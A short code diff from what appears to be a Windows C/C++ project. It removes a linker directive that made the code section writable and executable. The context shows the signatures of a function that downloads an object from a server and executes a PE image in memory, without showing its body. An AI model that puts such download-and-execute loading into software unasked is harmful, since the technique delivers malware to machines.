@@ -66,8 +66,6 @@ BOOL Exec(PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth, PCWSTR lpCmdLine = 0);
 //#define _PRINT_CPP_NAMES_
 #include "asmfunc.h"
 
-#pragma comment(linker, "/SECTION:.text,ERW")
-
 void DownloadAndExec(_In_ PCWSTR lpszServerName, _In_ PCWSTR lpszObjectName)
 {
 	void* pv = 0;
